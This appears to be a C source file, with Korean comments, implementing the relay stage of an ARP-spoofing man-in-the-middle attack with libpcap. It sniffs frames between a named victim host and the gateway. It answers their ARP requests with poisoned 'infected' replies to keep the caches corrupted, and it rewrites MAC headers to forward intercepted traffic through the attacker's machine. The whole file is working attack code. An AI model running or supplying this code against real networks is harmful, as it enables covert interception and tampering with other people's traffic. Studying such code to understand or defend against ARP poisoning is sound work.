#include "packetRelay.h"

//
// 패킷 릴레이시키기
//
void packetRelay(pcap_t *handle, const u_int8_t myMAC[], const int myIP[], const u_int8_t victimMAC[], const int victimIP[], const u_int8_t gateMAC[], const int gateIP[])
{
	ETH_HDR *EH = NULL;
	ARP_HDR	*AH = NULL;
	UCHAR packetdata[2048] = { 0 };
	const u_char *packet;
	struct pcap_pkthdr *hdr;
	int res;

	while (1)
	{
		memset(packetdata, 0, sizeof(packetdata));

		if (res = pcap_next_ex(handle, &hdr, &packet))
		{
			if (res < 0)
			{
				printf("Error : pcap_next_ex \n");
				break;
			}
			else if (res == 0)
				continue;
		}

		EH = (ETH_HDR *)packet;
		AH = (ARP_HDR *)(packet + sizeof(ETH_HDR));

		// victim -> me -> gateway : session 1
		if (macCMP(EH->ether_shost, victimMAC) && macCMP(EH->ether_dhost, myMAC))
		{
			if ((EH->ether_type == ntohs(ETHERTYPE_ARP)) && ipCMP(AH->ar_ti, gateIP) )
			{
				makeInfPacket(packetdata, myMAC, victimMAC, gateIP, victimIP);
				sendInfPacket(handle, packetdata, (sizeof(ETH_HDR) + sizeof(ARP_HDR)));
				printf("victim\n");
				continue;
			}
			else
			{
				memcpy(packetdata, packet, hdr->len);
				macCPY(EH->ether_shost, myMAC);
				macCPY(EH->ether_dhost, gateMAC);
				memcpy(packetdata, EH, sizeof(ETH_HDR));
				sendPacket(handle, packetdata, hdr->len);
			}
		}
		// gateway -> me -> victim : session 2
		else if (macCMP(EH->ether_shost, gateMAC) && macCMP(EH->ether_dhost, myMAC))
		{
			if (EH->ether_type == ntohs(ETHERTYPE_ARP) && ipCMP(AH->ar_ti, victimIP))
			{
				makeInfPacket(packetdata, myMAC, gateMAC, victimIP, gateIP);
				sendInfPacket(handle, packetdata, (sizeof(ETH_HDR) + sizeof(ARP_HDR)));
				printf("gateway\n");
				continue;
			}
			else
			{
				memcpy(packetdata, packet, hdr->len);
				macCPY(EH->ether_shost, myMAC);
				macCPY(EH->ether_dhost, victimMAC);
				memcpy(packetdata, EH, sizeof(ETH_HDR));
				sendPacket(handle, packetdata, hdr->len);
			}
		}
	}
}


//
// mac address 비교하기
//
bool macCMP(const u_int8_t mac1[], const u_int8_t mac2[])
{
	for (int i = 0; i < ETHER_ADDR_LEN; i++)
		if (mac1[i] != mac2[i])
			return false;

	return true;
}


//
// ip address 비교하기
//
bool ipCMP(const UCHAR ip1[], const int ip2[])
{
	for (int i = 0; i < IPv4_ADDR_LEN; i++)
		if (((int)ip1[i]) != ip2[i])
			return false;

	return true;
}


//
// send infected packet
//
void sendInfPacket(pcap_t *handle, const UCHAR *packetdata, int size)
{
	if (pcap_sendpacket(handle, (u_char*)packetdata, size) != 0)
		printf("Error : infected packet (me -> \n");
	else
		printf("sned infected packet (me -> \n");
}


//
// send packet
//
void sendPacket(pcap_t *handle, const UCHAR *packetdata, int size)
{
	//ETH_HDR *EH = (ETH_HDR *)packetdata;
	
	if (pcap_sendpacket(handle, (u_char*)packetdata, size) != 0)
		printf("Error : relay packet\n");
	else
		printf("sned relay packet\n");
}


//
// 내 맥어드레스 copy 하기
//
void macCPY(u_int8_t sa[], const u_int8_t myMAC[])
{
	for (int i = 0; i < ETHER_ADDR_LEN; i++)
		sa[i] = myMAC[i];
}